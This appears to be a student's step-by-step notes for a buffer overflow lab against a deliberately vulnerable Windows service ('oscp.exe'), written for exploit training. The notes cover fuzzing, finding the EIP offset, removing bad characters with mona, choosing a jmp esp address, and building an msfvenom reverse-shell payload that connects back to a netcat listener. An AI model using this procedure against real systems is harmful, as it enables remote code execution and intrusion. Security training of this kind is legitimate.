Target application

* Windows 7, 32 bit, littel endian architecture.
* Immunity Debugger and Putty tools
* Windows Firewall and Defender disabled
* vulanable-apps (oscp.exe)
* IP: 10.10.226.237, PORT:1337
* I will exploit it on port #4000


helpful commmands:

* sudo pkill -9 nc
* sudo killall openvpn
* sudo nc -nlvp 4000


1)  nc 10.10.226.237 1337

* connect to vulanable application


2) !mona config -set workingfolder c:\mona\%p 

* to make Immunity Debugger easily working on it. (Mona: is a powerful plugin for Immunity Debugger that makes exploiting buffer overflows much easier.)

3) python3 fusser.py 

* The fuzzer will send increasingly long strings comprised of (A)s. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message.
* Make a note of the largest number of bytes that were sent.
* EIP register (Extended Instruction Pointer): contains the address of the instruction following the CALL instruction.
* when excuting 41414141; access violation -> caused creash the server
* I know right now its creash after sending 1900 byte so the next pattern will be 2000 byte

4) /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 2000

* Run this command to generate a cyclic pattern of a length 2100 bytes longer that the string that crashed the server.


5) python3 exploit.py

* Crash Replication & Controlling EIP
* I will copy the output of step_4 and change the value of payload variable in exploit.py
* EAX Accumulator (storage for data)
* ESP stack pointer (stores the address of the last program request in a stack)
* More details http://ece-research.unm.edu/jimp/310/slides/micro_arch1.html


6) mona findmsp -distance 2000

* EIP contains noraml pattern: offset 1978.
* then set the variable offset in exploit file.
* so right now I recognized the offset value.
* so I will set the value of payload to an empty string.
* I will set retn to BBBB

7) python3 exploit.py

* as we can see the EIP register now overwritten with this value 42424242

8) !mona bytearray -b "\x00" on Immunity Debugger and run generate_badbyte.py on my machine

* Finding Bad Characters
* this will generate bytearray from 1 to 256 byte and exculde null byte \x00
* then set payload variable in exploit file with the output of runing the script
* ESP register points

9) python3 exploit.py

10) !mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>

* We run this scrip to indicate any characters that are different in memory to what they are in the generated bytearray.bin (step 8)
* Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.
* Bad chars is 00 (exculded) & 01 
* so 01 will remove it from script as well (set payload variable in exploit.py)


11) repeat step 9 & 10 till remove all the bad chars from payload string

* New bad chars appeard (00 01 07 08 2e 2f a0 a1) so I will exculde them from payload string.

12) !mona jmp -r esp -cpb "\x00\x07\x2e\xa0"

* Finding a Jump Point
* This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified
* take one of the address and set the retn value with it.  retn = "\xaf\x11\x50\x62"

13) msfvenom -p windows/shell_reverse_tcp LHOST=tun2 LPORT=4000 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py -v payload

* this will generate payload

14) set for padding becuse we need some space in memory for the payload to unpack itself.

* padding = "\x90" * 16 
* \x90 No Operation  donâ€™t cause anything to happen, they just go on to the next operation. used for padding in the memory.










